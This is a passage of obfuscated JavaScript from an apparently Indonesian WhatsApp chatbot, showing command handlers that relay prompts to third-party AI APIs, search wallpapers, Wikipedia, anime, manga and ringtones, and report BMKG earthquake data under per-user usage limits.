          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'gandalf':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x37a46f = "https://api.siputzx.my.id/api/ai/gandalf?prompt=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x2d6d87 = await fetchJson(_0x37a46f);
            if (_0x2d6d87.status) {
              _0x3a091f(_0x2d6d87.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x1d39c6) {
            console.error(_0x1d39c6);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'gemini-pro':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x3207a7 = "https://api.siputzx.my.id/api/ai/gemini-pro?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x34cec2 = await fetchJson(_0x3207a7);
            if (_0x34cec2.status) {
              _0x3a091f(_0x34cec2.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x49de42) {
            console.error(_0x49de42);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'gemma':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x10e92c = 'https://api.siputzx.my.id/api/ai/gemma?prompt=You%20are%20an%20assistant%20that%20always%20responds%20in%20Indonesian%20with%20a%20friendly%20and%20informal%20tone&message=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x380a73 = await fetchJson(_0x10e92c);
            if (_0x380a73.status) {
              _0x3a091f(_0x380a73.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x22cc70) {
            console.error(_0x22cc70);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "gpt3":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x316b72 = "https://api.siputzx.my.id/api/ai/gpt3?prompt=Kamu%20adalah%20ai%20yang%20ceria&content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x58223d = await fetchJson(_0x316b72);
            if (_0x58223d.status) {
              _0x3a091f(_0x58223d.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x475773) {
            console.error(_0x475773);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "gita":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x3d31db = "https://api.siputzx.my.id/api/ai/gita?q=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x334139 = await fetchJson(_0x3d31db);
            if (_0x334139.status) {
              _0x3a091f(_0x334139.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x8d02e1) {
            console.error(_0x8d02e1);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "metaai":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x2e258f = 'https://api.siputzx.my.id/api/ai/metaai?query=' + encodeURIComponent(_0x2b2627);
          try {
            const _0x494154 = await fetchJson(_0x2e258f);
            if (_0x494154.status) {
              _0x3a091f(_0x494154.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x3c87fa) {
            console.error(_0x3c87fa);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "mistral-7b-instruct-v0.2":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x52338f = 'https://api.siputzx.my.id/api/ai/mistral-7b-instruct-v0.2?content=' + encodeURIComponent(_0x2b2627);
          try {
            const _0xb43edd = await fetchJson(_0x52338f);
            if (_0xb43edd.status) {
              _0x3a091f(_0xb43edd.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0xb45094) {
            console.error(_0xb45094);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "muslimai":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x2efdf3 = "https://api.siputzx.my.id/api/ai/muslimai?query=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x5cdb9e = await fetchJson(_0x2efdf3);
            if (_0x5cdb9e.status) {
              _0x3a091f(_0x5cdb9e.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x1f67a5) {
            console.error(_0x1f67a5);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'naw':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x256404) {
            return _0x3a091f(mess.premium);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Tolong masukkan pertanyaan atau perintah, kak!");
          }
          const _0x525037 = "https://api.siputzx.my.id/api/ai/naw?content=" + encodeURIComponent(_0x2b2627);
          try {
            const _0x1da210 = await fetchJson(_0x525037);
            if (_0x1da210.status) {
              _0x3a091f(_0x1da210.data);
            } else {
              _0x3a091f("Maaf, aku nggak bisa memberikan jawaban sekarang. Coba lagi nanti, ya!");
            }
          } catch (_0x398686) {
            console.error(_0x398686);
            _0x3a091f("Oops! Ada masalah saat mencoba mengakses API. Coba lagi nanti ya!");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "simi":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *teks percakapan*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " Halo, apa kabar?");
          }
          try {
            const _0x5c925f = await chatSimi(_0x2b2627, 'id');
            if (!_0x5c925f) {
              return _0x3a091f("⚠️ KoKoRey gak dapet jawaban dari SimSimi, Kak! 🥲");
            }
            _0x3a091f('' + _0x5c925f);
          } catch (_0x1cf20a) {
            console.error(_0x1cf20a);
            _0x3a091f("❌ Ada masalah waktu ngobrol sama SimSimi, Kak! Coba lagi nanti ya 🥺");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
        ;
      case "wallpaper":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *kata kunci* [halaman]\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " nature 2");
          }
          const [_0x31d6de, _0x9c1d34] = _0x2b2627.split(" ");
          try {
            const _0x427287 = await wallpaper(_0x31d6de, _0x9c1d34 || '1');
            if (_0x427287.length === 0x0) {
              return _0x3a091f("⚠️ KoKoRey gak nemu wallpaper dengan kata kunci \"" + _0x31d6de + "\", Kak! 🥲");
            }
            let _0x5df12c = _0x427287.map(_0x34e2d0 => "🖼️ *" + _0x34e2d0.title + "*\n🔗 " + _0x34e2d0.source + "\n🌟 *Tipe*: " + _0x34e2d0.type).join("\n\n");
            _0x3a091f("🎨 *Hasil Wallpaper untuk*: " + _0x31d6de + "\n\n" + _0x5df12c);
          } catch (_0x19704f) {
            console.error(_0x19704f);
            _0x3a091f("❌ Ada masalah waktu ambil wallpaper, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "wikimedia":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *kata kunci*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " sunset");
          }
          try {
            const _0x490686 = await wikimedia(_0x2b2627);
            if (_0x490686.length === 0x0) {
              return _0x3a091f("⚠️ KoKoRey gak nemu gambar di Wikimedia dengan kata kunci \"" + _0x2b2627 + "\", Kak! 🥲");
            }
            let _0x37825a = _0x490686.map(_0x4c6f3a => "🖼️ *" + (_0x4c6f3a.title || "Tanpa Judul") + "*\n🔗 " + _0x4c6f3a.source).join("\n\n");
            _0x3a091f("🌐 *Hasil Pencarian Wikimedia untuk*: " + _0x2b2627 + "\n\n" + _0x37825a);
          } catch (_0xfd9667) {
            console.error(_0xfd9667);
            _0x3a091f("❌ Ada masalah waktu ambil gambar dari Wikimedia, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "wikipedia":
      case "wiki":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Hmm... Apa ya yang Kamu cari di Wikipedia? Coba ketik nama atau topik yang ingin dicari~ 😊");
          }
          try {
            const _0x530762 = await axios.get("https://id.wikipedia.org/wiki/" + _0x2b2627);
            const _0x4e572b = cheerio.load(_0x530762.data);
            let _0x110867 = _0x4e572b("#firstHeading").text().trim();
            let _0x34ed3e = _0x4e572b("#mw-content-text > div.mw-parser-output").find('p').text().trim();
            if (!_0x110867 || !_0x34ed3e) {
              return _0x3a091f("Aduh, sepertinya gak ada hasil untuk pencarian ini 😔 Coba kata kunci yang lain!");
            }
            _0x3a091f("📛 *Judul*: " + _0x110867 + "\n\n✨ *Deskripsi Singkat*: " + _0x34ed3e + "\n\nSemoga membantu ya! Kalau masih penasaran, coba cari topik lain lagi~ 😄");
          } catch (_0x40f79e) {
            _0x3a091f("Wah, ada yang error nih! Gak bisa menemukan apa yang Kamu cari 😓. Coba lagi nanti ya!");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'happymod':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *nama aplikasi*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " Minecraft");
          }
          try {
            const _0x393a3c = await happymod(_0x2b2627);
            if (_0x393a3c.length === 0x0) {
              return _0x3a091f("⚠️ KoKoRey gak nemu aplikasi di HappyMod dengan kata kunci \"" + _0x2b2627 + "\", Kak! 🥲");
            }
            let _0xd7ed37 = _0x393a3c.map(_0x3431bf => "📱 *" + _0x3431bf.title + "*\n⭐ *Rating*: " + _0x3431bf.rating + "\n🔗 " + _0x3431bf.link).join("\n\n");
            _0x3a091f("📦 *Hasil Pencarian HappyMod untuk*: " + _0x2b2627 + "\n\n" + _0xd7ed37);
          } catch (_0x4ee2bd) {
            console.error(_0x4ee2bd);
            _0x3a091f("❌ Ada masalah waktu ambil data dari HappyMod, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'ringtone':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Gunakan dengan cara: " + (_0x4773c6 + _0x4ac520) + " *judul ringtone*\n\n🤔 *Contohnya:*\n\n" + (_0x4773c6 + _0x4ac520) + " iPhone");
          }
          try {
            const _0x3cc271 = await ringtone(_0x2b2627);
            if (_0x3cc271.length === 0x0) {
              return _0x3a091f("⚠️ KoKoRey gak nemu ringtone dengan kata kunci \"" + _0x2b2627 + "\", Kak! 🥲");
            }
            let _0x283c47 = _0x3cc271.map(_0x43c747 => "🎵 *" + _0x43c747.title + "*\n🔗 " + _0x43c747.audio).join("\n\n");
            _0x3a091f("🔊 *Hasil Pencarian Ringtone untuk*: " + _0x2b2627 + "\n\n" + _0x283c47);
          } catch (_0x7223db) {
            console.error(_0x7223db);
            _0x3a091f("❌ Ada masalah waktu ambil ringtone, Kak! Coba lagi nanti ya 🥺");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "traceanime":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x404a1d = _0x3f87c6.quoted ? _0x3f87c6.quoted : _0x3f87c6;
            let _0x2b2fc8 = (_0x404a1d.msg || _0x404a1d).mimetype || _0x404a1d.mediaType || '';
            if (!_0x2b2fc8.startsWith("image")) {
              return _0x3a091f("*Tolong kirim gambar terlebih dahulu* 📸");
            }
            let _0x2ed136 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x404a1d);
            let _0x137b2e = await fileIO(_0x2ed136);
            let _0x493d6d = 'https://api.trace.moe/search?anilistInfo&url=' + encodeURIComponent(_0x137b2e);
            console.log("API URL:", _0x493d6d);
            let _0x5efdd2 = await fetch(_0x493d6d);
            let _0x24360f = await _0x5efdd2.json();
            console.log("API Data:", _0x24360f);
            if (!_0x24360f || _0x24360f.error || _0x24360f.result.length === 0x0) {
              return _0x3a091f("*Error: Tidak dapat melacak anime dari gambar ini.* 😞");
            }
            let {
              anilist: _0x2d7e95,
              from: _0x4dd06b,
              to: _0x8eb614,
              similarity: _0x16612,
              video: _0xa1713c,
              image: _0x29dcc6,
              episode: _0x46529d
            } = _0x24360f.result[0x0];
            let _0x238816 = _0x2d7e95.title ? _0x2d7e95.title.romaji || _0x2d7e95.title.native : "Judul Tidak Dikenal";
            let _0x272e2e = "✨ *Anime yang Terdeteksi*: " + _0x238816 + "\n";
            if (_0x2d7e95.synonyms && _0x2d7e95.synonyms.length > 0x0) {
              _0x272e2e += "✨ *Sinonim*: " + _0x2d7e95.synonyms.join(", ") + "\n";
            }
            _0x272e2e += "✨ *Tingkat Kesesuaian*: " + _0x16612.toFixed(0x2) + "%\n";
            _0x272e2e += "✨ *Durasi Waktu*: " + _0x45411f(_0x4dd06b * 0x3e8) + " · " + _0x45411f(_0x8eb614 * 0x3e8) + "\n";
            if (_0x46529d) {
              _0x272e2e += "✨ *Episode*: " + _0x46529d + "\n";
            }
            console.log("Informasi Anime:", {
              'animeTitle': _0x238816,
              'synonyms': _0x2d7e95.synonyms ? _0x2d7e95.synonyms.join(", ") : "Tidak Tersedia",
              'similarity': _0x16612,
              'timestamp': _0x45411f(_0x4dd06b * 0x3e8) + " - " + _0x45411f(_0x8eb614 * 0x3e8),
              'video': _0xa1713c,
              'episode': _0x46529d
            });
            await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'video': {
                'url': _0xa1713c
              },
              'caption': _0x272e2e
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x41240b) {
            console.error("Error:", _0x41240b);
            _0x3a091f("*Error: Tidak dapat melacak anime atau mengirim video.* 😞");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "mangainfo":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x2719f5 = _0x143458.join(" ");
          if (!_0x2719f5) {
            return _0x3a091f("⚠️ Mohon masukkan nama manga yang ingin dicari.");
          }
          try {
            const _0x94aed6 = await komiku('manga', _0x2719f5);
            if (_0x94aed6.length === 0x0) {
              return _0x3a091f("⚠️ Manga tidak ditemukan. Coba cari dengan nama lain.");
            }
            let _0x25b530 = "📚 *Hasil Pencarian Manga - " + _0x2719f5 + "* 📚\n\n";
            _0x94aed6.slice(0x0, 0x5).forEach((_0x50389e, _0x39bf96) => {
              _0x25b530 += "📖 *" + (_0x39bf96 + 0x1) + ". " + _0x50389e.title + "*\n";
              _0x25b530 += "🗂️ *Genre*: " + _0x50389e.genre + "\n";
              _0x25b530 += "🔗 *URL*: " + _0x50389e.url + "\n";
              _0x25b530 += "📖 *Deskripsi*: " + _0x50389e.description + "\n\n";
            });
            await _0x3a091f(_0x25b530);
          } catch (_0x532c68) {
            console.error(_0x532c68);
            _0x3a091f("⚠️ Terjadi kesalahan saat mencari manga.");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case "mangadetail":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x13d324 = _0x143458[0x0];
          if (!_0x13d324) {
            return _0x3a091f("⚠️ Mohon masukkan URL manga yang ingin dilihat detailnya.");
          }
          try {
            const _0x5c7fba = await detail(_0x13d324);
            let _0x5c8431 = "📚 *Detail Manga* 📚\n\n";
            _0x5c8431 += "📖 *Judul*: " + _0x5c7fba.title + "\n";
            _0x5c8431 += "🗂️ *Genre*: " + _0x5c7fba.genres.join(", ") + "\n";
            _0x5c8431 += "📖 *Deskripsi*: " + _0x5c7fba.description + "\n";
            _0x5c8431 += "📅 *Chapter Awal*: " + _0x5c7fba.awalChapter + "\n";
            _0x5c8431 += "📅 *Chapter Terbaru*: " + _0x5c7fba.newChapter + "\n";
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x5c7fba.coverImage
              },
              'caption': _0x5c8431
            }, {
              'quoted': _0x3f87c6
            });
          } catch (_0x30d4b8) {
            console.error(_0x30d4b8);
            _0x3a091f("⚠️ Terjadi kesalahan saat mengambil detail manga.");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'jkt48news':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          const _0x3d522e = _0x143458[0x0] || 'id';
          try {
            const _0x4a35af = await jktNews(_0x3d522e);
            if (_0x4a35af.length === 0x0) {
              return _0x3a091f("⚠️ Tidak ada berita terbaru JKT48 yang ditemukan.");
            }
            let _0x48bb19 = "🎤 *Berita Terbaru JKT48* 🎤\n\n";
            _0x4a35af.slice(0x0, 0x5).forEach((_0x3f6782, _0x58c60b) => {
              _0x48bb19 += "📰 *" + (_0x58c60b + 0x1) + ". " + _0x3f6782.title + "*\n";
              _0x48bb19 += "📅 *Tanggal*: " + _0x3f6782.date + "\n";
              _0x48bb19 += "🔗 *Link*: " + _0x3f6782.link + "\n\n";
            });
            await _0x3a091f(_0x48bb19);
          } catch (_0x115eb5) {
            console.error(_0x115eb5);
            _0x3a091f("⚠️ Terjadi kesalahan saat mengambil berita JKT48.");
          }
          db.data.users[_0x3f87c6.sender].limit -= 0x1;
          break;
        }
      case 'otakudesu':
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          let _0x1cd0ba = await otakuDesu.ongoing();
          let _0x554bc6 = "「 *JADWAL ANIME* 」\n\n";
          for (let _0x434299 of _0x1cd0ba) {
            _0x554bc6 += "*💬 Judul*: " + _0x434299.title + "\n";
            _0x554bc6 += "*📺 Eps*: " + _0x434299.episode + "\n";
            _0x554bc6 += "*🔗 URL*: " + _0x434299.link + "\n\n";
          }
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x554bc6,
            'contextInfo': {
              'mentionedJid': [_0x3f87c6.sender],
              'forwardingScore': 0xf423f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterName': saluranName,
                'newsletterJid': saluran
              },
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "Ini pemberitahuan Anime terbaru!",
                'mediaType': 0x1,
                'previewType': 0x1,
                'body': "Halo Kak 👋",
                'thumbnailUrl': imageUrl,
                'renderLargerThumbnail': false,
                'mediaUrl': wagc,
                'sourceUrl': wagc
              }
            }
          }, {
            'quoted': _0x3f87c6
          });
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "kusonimeinfo":
      case "animeinfo":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            const _0x2230c8 = await Kusonime.info();
            if (_0x2230c8.length === 0x0) {
              return _0x3a091f("⚠️ Tidak ada data anime terbaru yang ditemukan saat ini.");
            }
            let _0x625b39 = "🎌 *Anime Terbaru dari Kusonime* 🎌\n\n";
            _0x2230c8.slice(0x0, 0x5).forEach((_0x4a936c, _0x5e4466) => {
              _0x625b39 += "📺 *" + (_0x5e4466 + 0x1) + ". " + _0x4a936c.title + "*\n";
              _0x625b39 += "🔗 *URL*: " + _0x4a936c.url + "\n";
              _0x625b39 += "🗂️ *Genre*: " + _0x4a936c.genres.join(", ") + "\n";
              _0x625b39 += "📅 *Rilis*: " + _0x4a936c.releaseTime + "\n\n";
            });
            await _0x3a091f(_0x625b39);
          } catch (_0x252f7f) {
            console.error(_0x252f7f);
            _0x3a091f("⚠️ Terjadi kesalahan saat mengambil informasi anime terbaru.");
          }
          ;
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "kusonimesearch":
      case "animesearch":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          if (!_0x2b2627) {
            return _0x3a091f("⚠️ Kak, jangan lupa kasih judul anime yang mau dicari! 🥺\n*Kirim perintah*: *" + (_0x4773c6 + _0x4ac520) + " Naruto*");
          }
          try {
            const _0x7d71fa = await Kusonime.search(_0x2b2627);
            if (typeof _0x7d71fa === "string") {
              return _0x3a091f("⚠️ " + _0x7d71fa);
            }
            let _0xbaff31 = "🔍 *Hasil Pencarian untuk*: " + _0x2b2627 + "\n\n";
            _0x7d71fa.slice(0x0, 0x5).forEach((_0x3104b9, _0x509791) => {
              _0xbaff31 += "📺 *" + (_0x509791 + 0x1) + ". " + _0x3104b9.title + "*\n";
              _0xbaff31 += "🔗 *URL*: " + _0x3104b9.url + "\n";
              _0xbaff31 += "🗂️ *Genre*: " + _0x3104b9.genres.join(", ") + "\n";
              _0xbaff31 += "📅 *Rilis*: " + _0x3104b9.releaseTime + "\n\n";
            });
            await _0x3a091f(_0xbaff31);
          } catch (_0x3ac0ba) {
            console.error(_0x3ac0ba);
            _0x3a091f("⚠️ Terjadi kesalahan saat mencari anime di Kusonime.");
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case "infogempa":
      case "infobmkg":
      case "gempa":
      case "bmkg":
        {
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x3550c2 = await gempa();
            let _0x23acb0 = _0x3550c2.data;
            let _0xab1b68 = "「 *INFO GEMPA* 」\n\n";
            _0xab1b68 += "*🌍 Sumber*: " + _0x3550c2.source + "\n";
            _0xab1b68 += "*📊 Magnitudo*: " + _0x23acb0.magnitude.trim() + "\n";
            _0xab1b68 += "*📏 Kedalaman*: " + _0x23acb0.kedalaman.trim() + "\n";
            _0xab1b68 += "*🗺️ Lintang & Bujur*: " + _0x23acb0.lintang_bujur.trim() + "\n";
            _0xab1b68 += "*🕒 Waktu*: " + _0x23acb0.waktu.trim() + "\n";
            _0xab1b68 += "*📍 Wilayah*: " + (_0x23acb0.wilayah.trim() || "Tidak ada data") + "\n";
            _0xab1b68 += "*😱 Dirasakan*: " + (_0x23acb0.dirasakan.trim() || "Tidak ada data") + "\n\n";
            _0xab1b68 += "Tetap waspada dan ikuti arahan dari pihak berwenang!";
            if (_0x23acb0.imagemap) {
              _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'image': {
                  'url': _0x23acb0.imagemap.startsWith("http") ? _0x23acb0.imagemap : "https://www.bmkg.go.id" + _0x23acb0.imagemap
                },
                'caption': _0xab1b68,
                'contextInfo': {
                  'mentionedJid': [_0x3f87c6.sender],
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterName': saluranName,
                    'newsletterJid': saluran
                  },
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'title': "Informasi Gempa Terkini!",
                    'mediaType': 0x1,
                    'previewType': 0x1,
                    'body': "Stay Safe ya, Kak! 🤗",
                    'thumbnailUrl': imageUrl,
                    'renderLargerThumbnail': false,
                    'mediaUrl': 'https://www.bmkg.go.id',
                    'sourceUrl': 'https://www.bmkg.go.id'
                  }
                }
              }, {
                'quoted': _0x3f87c6
              });
            } else {
              _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': _0xab1b68,
                'contextInfo': {
                  'mentionedJid': [_0x3f87c6.sender],
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterName': saluranName,
                    'newsletterJid': saluran
                  },
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'title': "Informasi Gempa Terkini!",
                    'mediaType': 0x1,
                    'previewType': 0x1,
                    'body': "Stay Safe ya, Kak! 🤗",
                    'thumbnailUrl': imageUrl,
                    'renderLargerThumbnail': false,
                    'mediaUrl': "https://www.bmkg.go.id",
                    'sourceUrl': 'https://www.bmkg.go.id'
                  }
                }
              }, {
                'quoted': _0x3f87c6
              });
            }
          } catch (_0x370787) {
            console.error(_0x370787);
            _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': "⚠️ Maaf kak, terjadi kesalahan saat mengambil data gempa."
            }, {
              'quoted': _0x3f87c6
            });
          }
        }
        db.data.users[_0x3f87c6.sender].limit -= 0x1;
        break;
      case 'react':
        {
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'react': {
              'text': _0x143458[0x0],
              'key': _0x3f87c6.quoted ? _0x3f87c6.quoted.key : _0x3f87c6.key
            }
          });
        }
        break;
      case 'tagme':
        {
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': '@' + _0x3f87c6.sender.split('@')[0x0],
            'mentions': [_0x3f87c6.sender]
          });
        }
        ;
        break;
      case 'totalfeature':
      case "totalfitur":
      case "totalcmd":
      case 'totalcommand':
        _0x3a091f("✨ *Total Fitur yang Tersedia di " + botName + "*: " + _0x24e399() + " Fitur");
        break;
      case "cek":
      case "bot":
        {
